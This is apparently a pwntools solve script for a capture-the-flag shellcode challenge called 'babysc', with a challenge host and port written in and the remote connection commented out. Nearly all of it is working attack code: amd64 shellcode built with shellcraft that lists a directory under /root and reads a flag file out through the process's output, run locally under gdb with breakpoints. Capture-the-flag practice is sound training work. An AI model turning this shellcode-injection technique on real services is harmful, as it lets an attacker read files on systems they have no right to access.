from pwn import *
import sys

BINARY = './babysc'
# LIBC = './'
con = 'nc 139.59.97.212 23339'
if(con):
	con = con.split()
	HOST = con[1]
	PORT = con[2]

elf = ELF(BINARY, checksec=False)
# libc = ELF(LIBC)
argv = sys.argv
# context.terminal = 'tmux splitw -h -p 70'.split()
context.arch = 'amd64'
# context.log_level = 'DEBUG'
def exploit():
	payload = ''
	payload = shellcraft.openat(-100, "/root/Desktop/test_docker/")
	payload += shellcraft.getdents64('rax', "rsp", 500)
	payload += shellcraft.write(1, "rsp", 500)
	p.sendlineafter(": ", asm(payload))
	print(p.recv())
	p.interactive()


def exploit2():
	payload = ''
	payload = shellcraft.openat(-100, "/root/Desktop/test_docker/flag_in_real_life.txt", 0)
	# payload += "mov rbp, rax\n"
	payload += shellcraft.read("rax", "rsp", 500)
	payload += shellcraft.write(1, "rsp", 500)
	p.sendlineafter(": ", asm(payload))
	print(p.recv())
	p.interactive()


if __name__ == '__main__':
	# if len(argv) > 1 and argv[1] == 'r':
	# 	p = remote(HOST, PORT)
	# else:
	# 	p = process("./babysc", checksec=False)
	# 	if len(argv) > 1 and argv[1] == 'd':
	# 		cmd = '''
	# 		'''
	# 		gdb.attach(p, cmd)
	# p = process([elf.path], checksec=False)
	p = process("./babysc",aslr=False)
	cmd = '''
	b *0x555555554e07
	b *0x555555554e63
	c
	c
	si
	'''
	gdb.attach(p, cmd, aslr=0)
	# exploit()
	exploit2()
